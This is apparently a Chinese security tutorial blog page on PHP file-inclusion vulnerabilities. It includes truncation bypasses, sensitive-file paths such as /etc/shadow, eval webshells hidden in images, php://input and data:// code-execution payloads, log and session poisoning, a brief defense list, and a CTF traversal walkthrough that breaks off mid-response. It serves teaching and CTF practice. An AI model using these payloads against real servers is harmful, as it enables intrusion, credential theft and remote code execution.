class="operator">/</span>Off</span><br><span class="line">远程：allow_url_include<span class="operator">-</span><span class="keyword">On</span><span class="operator">/</span>Off</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?path=info.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本地：可通过相对路径方式找到文件</span><br><span class="line">?path=info.php</span><br><span class="line">远程：可通过http(s)或者ftp等方式远程加载文件</span><br><span class="line">?path=http:<span class="comment">//......info.php</span></span><br><span class="line">?path=ftp:<span class="comment">//......info.php</span></span><br></pre></td></tr></table></figure><p><strong>分类</strong></p><p><code>allow_url_fopen = On  allow_url_include = On</code></p><ul><li><strong>本地文件包含</strong>：通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行</li><li><strong>远程文件包含</strong>：就是允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=http://192.168.158.119/phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/Ru6oXCK2HdIsFUM.png" alt="image-20210415205303941"></p><h2 id="1-漏洞说明"><a href="#1-漏洞说明" class="headerlink" title="1. 漏洞说明"></a>1. 漏洞说明</h2><h3 id="1-1-无视文件扩展名读取文件"><a href="#1-1-无视文件扩展名读取文件" class="headerlink" title="1.1 无视文件扩展名读取文件"></a>1.1 无视文件扩展名读取文件</h3><p>使用 <code>文件包含</code> 时，php会读取文件的源码，即使是图片文件。当通过文件包含的方式打开一张图片时，会发现并没有打开图像，而是图片的 <code>源码</code> 。</p><h3 id="1-2-无条件解析PHP代码"><a href="#1-2-无条件解析PHP代码" class="headerlink" title="1.2 无条件解析PHP代码"></a>1.2 无条件解析PHP代码</h3><p><code>文件包含</code> 在读取文件源码的同时，如果遇到符合php语法规范的代码，就会无条件执行。无论是什么格式的文件。<br>例如：<br>phpinfo.zip<br>phpinfo.rar</p><p>phpinfo.txt</p><p><img src="https://i.loli.net/2021/06/06/8Bs1QMyRnJTFD4X.png" alt="image-20210415190302699"></p><p><img src="https://i.loli.net/2021/06/06/3jC1BIWe9Yzbs5E.png" alt="image-20210415190355325"></p><h3 id="1-3-空字符安全绕过–00截断"><a href="#1-3-空字符安全绕过–00截断" class="headerlink" title="1.3 空字符安全绕过–00截断"></a>1.3 空字符安全绕过–00截断</h3><p><strong>条件：PHP版本小于5.3.4，并且关闭魔术引号  <code>magic_quotes_gpc = Off</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>].<span class="string">&quot;.html&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?path=[path]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">index.html</span><br><span class="line">&lt;h1&gt;Hello World!&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/pAUSdNBoYa6E2Mt.png" alt="在这里插入图片描述"></p><p><strong>魔术引号的存在</strong><br><img src="https://i.loli.net/2021/06/06/WJlUqRgMnVDtdSZ.png" alt="在这里插入图片描述"><strong>关闭魔术引号</strong><br><img src="https://i.loli.net/2021/06/06/S3LQRuwE56K7xMP.png" alt="在这里插入图片描述"><strong>验证</strong><br><img src="https://i.loli.net/2021/06/06/cSkUEnR92hAzdoC.png" alt="在这里插入图片描述"></p><h3 id="1-4-长度截断"><a href="#1-4-长度截断" class="headerlink" title="1.4 长度截断"></a>1.4 长度截断</h3><p>利用操作系统对目录最大长度的限制，可以不需要 <code>%00</code> 而达到截断的目的</p><p>目录字符串，在 <code>window下256字节、linux下4096字节</code> 时会达到最大值，最大值长度之后的字符将被丢弃。</p><p>而利用”./“的方式即可构造出超长目录字符串</p><p><strong>条件：Windows系统，</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index.php <span class="comment">#限制了文件后缀</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>].<span class="string">&quot;.html&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?path=[path]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/GEL5RNbdKfkTQFa.png" alt="image-20210415194538865"></p><h3 id="1-5-问号-20-23-截断"><a href="#1-5-问号-20-23-截断" class="headerlink" title="1.5 问号,%20,%23 截断"></a>1.5 问号,%20,%23 截断</h3><p>远程文件包含时，如果出现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index.php <span class="comment">#限制了文件后缀</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>].<span class="string">&quot;.html&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?path=[path]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绕过：添加问号 结合HTTP传参的原理,问号&quot;?&quot;后面的代码被解释成URL的querystring</span></span><br><span class="line">?path=http:<span class="comment">//192.168.158.119/phpinfo.php?</span></span><br><span class="line">?path=http:<span class="comment">//192.168.158.119/phpinfo.php%20</span></span><br><span class="line">?path=http:<span class="comment">//192.168.158.119/phpinfo.php%23</span></span><br></pre></td></tr></table></figure><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="2-1读取敏感文件"><a href="#2-1读取敏感文件" class="headerlink" title="2.1读取敏感文件"></a>2.1读取敏感文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用绝对路径：</span><br><span class="line">http:<span class="comment">//192.168.199.131/include/include.php?path=c:\windows\System32\drivers\etc\hosts</span></span><br><span class="line"></span><br><span class="line">如果当前文件夹与所要包含的文件夹在同一盘符下：</span><br><span class="line">    #可目录穿越</span><br><span class="line">http:<span class="comment">//192.168.199.131/include/include.php?path=..\..\..\..\..\..\..\..\windows\System32\drivers\etc\hosts</span></span><br></pre></td></tr></table></figure><h4 id="2-1-1-常见敏感信息路径"><a href="#2-1-1-常见敏感信息路径" class="headerlink" title="2.1.1 常见敏感信息路径"></a>2.1.1 常见敏感信息路径</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows系统</span></span><br><span class="line"></span><br><span class="line">c:\boot.ini <span class="comment">// 查看系统版本</span></span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml <span class="comment">// IIS配置文件</span></span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam <span class="comment">// 存储Windows系统初次安装的密码</span></span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini <span class="comment">// MySQL配置</span></span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD <span class="comment">// MySQL root密码</span></span><br><span class="line"></span><br><span class="line">c:\windows\php.ini <span class="comment">// php 配置信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Linux/Unix系统</span></span><br><span class="line"></span><br><span class="line">/etc/passwd <span class="comment">// 账户信息</span></span><br><span class="line"></span><br><span class="line">/etc/shadow <span class="comment">// 账户密码文件</span></span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf <span class="comment">// Apache2默认配置文件</span></span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf <span class="comment">// 虚拟网站配置</span></span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini <span class="comment">// PHP相关配置</span></span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf <span class="comment">// Apache配置文件</span></span><br><span class="line"></span><br><span class="line">/etc/my.conf <span class="comment">// mysql 配置文件</span></span><br></pre></td></tr></table></figure><h3 id="2-2-包含图片木马"><a href="#2-2-包含图片木马" class="headerlink" title="2.2 包含图片木马"></a>2.2 包含图片木马</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.199.131/include/include.php?path=./future_ma1.jpg</span></span><br><span class="line"></span><br><span class="line">future_ma1.jpg 是经过 &lt;?php @eval($_REQUEST[<span class="string">&#x27;aaa&#x27;</span>]); ?&gt; 处理过的图片木马</span><br><span class="line"></span><br><span class="line">可中国蚁剑进行连接</span><br></pre></td></tr></table></figure><h3 id="2-3-包含木马写-shell"><a href="#2-3-包含木马写-shell" class="headerlink" title="2.3 包含木马写 shell"></a>2.3 包含木马写 shell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将如下代码插入图片当中：</span><br><span class="line">&lt;?<span class="function">php <span class="title">fputs</span><span class="params">(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;</span>)</span></span>; ?&gt;</span><br><span class="line">含义：在当前目录下创建一个shell.php文件，内容为&lt;?php @eval($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])?&gt;一句话木马，当直接包含文件时，就会执行。</span><br></pre></td></tr></table></figure><h3 id="2-4-PHP-封装协议"><a href="#2-4-PHP-封装协议" class="headerlink" title="2.4 PHP 封装协议"></a>2.4 PHP 封装协议</h3><p><strong>条件</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php.ini文件：</span><br><span class="line">本地：allow_url_fopen<span class="operator">=</span><span class="keyword">On</span></span><br><span class="line">远程：allow_url_include<span class="operator">=</span><span class="keyword">On</span></span><br></pre></td></tr></table></figure><h4 id="2-4-1-访问本地文件"><a href="#2-4-1-访问本地文件" class="headerlink" title="2.4.1 访问本地文件"></a>2.4.1 访问本地文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用file://协议</span></span><br><span class="line">?path=file:<span class="comment">//c:\windows\System32\drivers\etc\hosts</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#data://协议</span></span><br><span class="line">?path=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span></span><br><span class="line">?path=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#具体示例：</span></span><br><span class="line"><span class="comment">#当前文件路径</span></span><br><span class="line">?page=data:<span class="comment">//text/plain, <span class="meta">&lt;?php</span> echo $_SERVER[&#x27;DOCUMENT_ROOT&#x27;]; <span class="meta">?&gt;</span> </span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#遍历当前路径下的所有文件</span></span><br><span class="line">?page=data:<span class="comment">//text/plain, <span class="meta">&lt;?php</span> print_r(scandir(&#x27;/var/www&#x27;))<span class="meta">?&gt;</span></span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#读取指定文件    </span></span><br><span class="line">?page=data:<span class="comment">//text/plain, <span class="meta">&lt;?php</span> $a = file_get_contents(&#x27;fl4gisisish3r3.php&#x27;);echo htmlentities($a); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="2-4-2-读取PHP文件"><a href="#2-4-2-读取PHP文件" class="headerlink" title="2.4.2 读取PHP文件"></a>2.4.2 读取PHP文件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?path=php:<span class="comment">//filter/read=convert.base64-encode/resource=phpinfo.php</span></span><br><span class="line"></span><br><span class="line">将所得内容进行 base64解码即可</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210214200538890.png" alt="在这里插入图片描述"><br><img src="https://i.loli.net/2021/06/06/ljnfQ3vE6tPc1g9.png" alt="在这里插入图片描述"></p><h4 id="2-4-3-执行PHP命令"><a href="#2-4-3-执行PHP命令" class="headerlink" title="2.4.3 执行PHP命令"></a>2.4.3 执行PHP命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">post:<span class="meta">&lt;?php</span> system(<span class="string">&#x27;ipconfig&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">     <span class="meta">&lt;?php</span> system(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/06/2z7K3Qhl5eo4Esk.png" alt="在这里插入图片描述"></p><h3 id="2-5-包含日志文件"><a href="#2-5-包含日志文件" class="headerlink" title="2.5 包含日志文件"></a>2.5 包含日志文件</h3><p><strong>nigux 日志文件路径</strong></p><blockquote><p>/var/log/nginx/assess.log</p><p>/var/log/nginx/error.log</p></blockquote><p><strong>apache+Linux日志默认路径</strong></p><blockquote><p>/etc/httpd/logs/access_log/var/log/httpd/access_log</p></blockquote><p><strong>apache+win2003日志默认路径</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\xampp\apache\logs\access.log</span><br><span class="line">D:\xampp\apache\logs\error.log</span><br></pre></td></tr></table></figure><p><strong>IIS6.0+win2003默认日志文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br></pre></td></tr></table></figure><p><strong>IIS7.0+win2003 默认日志文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemDrive%inetpublogsLogFiles</span><br></pre></td></tr></table></figure><p>nginx 日志文件在用户安装目录的logs目录下</p><p>如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里</p><p>也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）</p><h4 id="2-5-1-Apache-错误日志文件-getshell"><a href="#2-5-1-Apache-错误日志文件-getshell" class="headerlink" title="2.5.1 Apache 错误日志文件 getshell"></a>2.5.1 Apache 错误日志文件 getshell</h4><p><strong>phpstudy2016(Apache)+Win2003</strong></p><blockquote><p>D:\phpStudy\Apache\logs\error.log</p></blockquote><p><strong>构造一句话木马写入 Apache日志文件当中</strong><br><img src="https://i.loli.net/2021/06/06/tRi7pVXsmoD3FGb.png" alt="在这里插入图片描述"><img src="https://i.loli.net/2021/06/06/7Wibc8HMSTa2wnL.png" alt="在这里插入图片描述"></p><p><strong>访问</strong></p><p><img src="https://i.loli.net/2021/06/06/a6im4kHOnDxGTgl.png" alt="在这里插入图片描述"></p><p><strong>蚁剑连接</strong></p><p><img src="https://i.loli.net/2021/06/06/34l7JGxMkEKY68V.png" alt="在这里插入图片描述"></p><p><strong>phpstudy小皮面板(Apache)+Win10</strong></p><blockquote><p>D:\phpstudy_pro\Extensions\Apache2.4.39\logs</p></blockquote><p><img src="https://i.loli.net/2021/06/06/zmopQn46y7eGaD2.png" alt="image-20210415200828715"></p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210415202541715.png" alt="image-20210415202541715"></p><h4 id="2-5-2-session-文件包含"><a href="#2-5-2-session-文件包含" class="headerlink" title="2.5.2 session 文件包含"></a>2.5.2 session 文件包含</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</p><h3 id="2-6-任意目录遍历"><a href="#2-6-任意目录遍历" class="headerlink" title="2.6 任意目录遍历 ../../"></a>2.6 任意目录遍历 <code>../../</code></h3><p><strong>防御：</strong><code>php.ini</code> 当中的配置 <code>open_basedir</code> ，将很好可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。而没有设置open_basedir时，文件包含漏洞可以访问任意文件。</p><p>经查看之后，各个版本的php该配置默认如下：</p><p><img src="https://i.loli.net/2021/06/06/o1q26TgN9bXkZSx.png" alt="image-20210415203241871"></p><p>修改配置，只允许用户包含指定目录下的文件</p><p><img src="https://i.loli.net/2021/06/06/vmLCkaI6n7BijH1.png" alt="image-20210415204112127"></p><p>再次尝试包含非指定目录下的文件</p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210415204235730.png" alt="image-20210415204235730"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#各种语言文件包含</span></span><br><span class="line"><span class="comment">#ASP ASPX PHP JSP Python Javaweb</span></span><br><span class="line">&lt;c:import url=<span class="string">&quot;http://...&quot;</span>&gt;</span><br><span class="line">&lt;jsp:include page=<span class="string">&quot;head.jsp&quot;</span>/&gt;</span><br><span class="line">&lt;%@ include file=<span class="string">&quot;head.jsp&quot;</span>%&gt;</span><br><span class="line">&lt;?php include (<span class="string">&#x27;test.php&#x27;</span>) ?&gt;</span><br></pre></td></tr></table></figure><h2 id="3-漏洞防御"><a href="#3-漏洞防御" class="headerlink" title="3. 漏洞防御"></a>3. 漏洞防御</h2><ul><li>严格限制包含中的参数，取消那些不可控的参数。</li><li>开启open_basedir 配置，将其设置为指定目录，则只有该目录的文件允许被访问</li><li>如果不需要文件包含，则关闭allow_url_include()函数，防止远程文件包含</li><li>固定后缀</li><li>固定文件</li><li>WAF 产品</li></ul><p>检测：</p><ul><li>白盒：代码审计</li><li>黑盒：漏扫工具，公开漏洞，手工查看参数以及功能点</li></ul><p>利用：</p><ul><li>http</li><li>ftp <a href="ftp://username:password@192.168.0.1/profile">ftp://username:password@192.168.0.1:21/profile</a></li><li>file</li><li>各种脚本支持的协议</li></ul><h1 id="二、文件读取漏洞–显示源代码"><a href="#二、文件读取漏洞–显示源代码" class="headerlink" title="二、文件读取漏洞–显示源代码"></a>二、文件读取漏洞–显示源代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>            </span><br><span class="line"><span class="variable">$filename</span>=”test.txt”;</span><br><span class="line">readfile(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   <span class="comment">#输出文件内容</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=”test.txt”;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#将整个文件读入一个字符串</span></span><br></pre></td></tr></table></figure><p><strong>相关函数：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readfile()</span><br><span class="line">file_get_contents()</span><br><span class="line">fopen()</span><br><span class="line">变量：<span class="variable">$filename</span></span><br></pre></td></tr></table></figure><h2 id="2-1-百度杯2017二月-Zone真题复现"><a href="#2-1-百度杯2017二月-Zone真题复现" class="headerlink" title="2.1 百度杯2017二月-Zone真题复现"></a>2.1 百度杯2017二月-Zone真题复现</h2><p><a href="https://www.ichunqiu.com/battalion?t=1&r=57475">网址</a></p><p>分别抓包，修改参数 <code>login=1</code> 试试</p><p><img src="https://i.loli.net/2021/06/06/9PtsoLqbQjHOp8N.png" alt="image-20210416220034033"></p><p><img src="https://i.loli.net/2021/06/06/IcqNsdGBAlmR1Fp.png" alt="image-20210416220138595"></p><p>发现修改 <code>Mini-Zone </code> 数据包当中的 <code>login=1</code> 之后成功进入管理员的界面</p><p>对 <code>manage</code>  再抓包，修改 <code>login=1</code> ，获取 <code>/manages/admin.php?module=index&amp;name=php</code> 。</p><p>mvc架构</p><p>读取nginx配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /manages/admin.php?module=..././..././..././etc/nginx/nginx.conf&amp;name= HTTP/1.1</span><br></pre></td></tr></table></figure><p>获得返回200</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 16 Apr 2021 14:13:40 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">content-text: text/html;charset=gbk</span><br><span class="line">X-Via-JSL: 38ae086,-</span><br><span class="line">X-Cache: bypass</span><br><span class="line">Content-Length: 2708</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span 